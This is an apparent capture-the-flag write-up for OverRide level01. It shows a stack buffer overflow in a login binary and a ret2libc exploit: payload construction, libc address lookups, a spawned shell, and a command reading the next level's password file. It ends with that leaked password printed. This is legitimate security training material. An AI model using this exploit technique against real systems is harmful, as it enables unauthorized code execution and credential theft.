# Level 01

The program asks for a username and a password.
But this is irrelevent because either way we are doing nothing with it.
However we need the good username to be able to access the password input.
The password buffer is 64 char long, but `fgets()` reads 100 chars, here is our overflow.
We see in the source code that the function that checks the user needs the `dat_wil` username.

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
I have no clue (yet)
nope, incorrect password...
```

Nice, now lets try to overflow it.

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope, incorrect password...

Segmentation fault (core dumped)
level01@OverRide:~$ dmesg | tail -n1
[22893.142169] level01[7344]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffd650 error 14
```

We see that we indeed have a segfault. Now we are going to do a ret2libc.
Basically we will change the return address to the one of `system()` to be able to launch a shell.

Lets try. `"\xd0\xae\xe6\xf7"` is the address of `system()`

```bash
level01@OverRide:~$ ./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7")')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

sh: 1: %���: not found
Segmentation fault (core dumped)
```

Promising! We have this error: `sh: 1: %���: not found` that indicates that surely got into `system()`.
Lets verify with `strace` what happened.

```bash
level01@OverRide:~$ strace -f ./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7")')
[...]
execve("/bin/sh", ["sh", "-c", "\364\330\377\377"], [/* 29 vars */]) = 0
[...]
```

Yes, /bin/sh is executed. So now we just need to change the garbage data of the first argument: `\364\330\377\377`.
Instead we want to but a pointer to a string that reads "/bin/sh",
so it would be as if we did `/bin/sh -c /bin/sh` on a terminal.
For this we need to understand what will be on the stack at the moment of our code redirection.

```
+--------+--------------+
| $esp+8 |  0x????????  |	First argument, address of "/bin/sh"
+--------+--------------+
| $esp+4 |  0x????????  |	Address of the return of `system()`
+--------+--------------+
|  $esp  |  0xf7e6aed0  |	Address of the `system()` function
+--------+--------------+
```

This is how the stack is made when we redirect the execution.
We do not care where `system()` returns becaus it would've already done its job,
so I'm just gonna replace it with `AAAA` (`0x41414141`).
Now we only need to have the addres of "/bin/sh".
We can find it in the libc like this:

```bash
level01@OverRide:~$ grep -oba "/bin/sh" /lib32/libc-2.15.so 
1431532:/bin/sh
```
So the string is located 1431532 bits after the start of the libc.
We can check this information in GDB.

```gdb
(gdb) info proc map
process 1903
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) x/s 0xf7e2c000+1431532
0xf7f897ec:      "/bin/sh"
```

So the address of "/bin/sh" is `0xf7f897ec`. Lets try:

```bash
level01@OverRide:~$ strace -f ./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7")')
[...]
[pid  1980] execve("/bin/sh", ["sh", "-c", "/bin/sh"], [/* 29 vars */]) = 0
[...]
level01@OverRide:~$ ./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7" 
+ "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7")')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

Segmentation fault (core dumped)
```

Now we have the right `execve()` call, but we still have nothing.
It's normal because we didn't tell it to do anything. We need to add the padding to fill the `fgets()`  buffer, and then write `cat /home/users/level01/.pass\n`.

```bash
level01@OverRide:~$ ./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7" + "o" * 3996 + "cat /home/users/level02/.pass\n")')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
Segmentation fault (core dumped)
```

Here we go!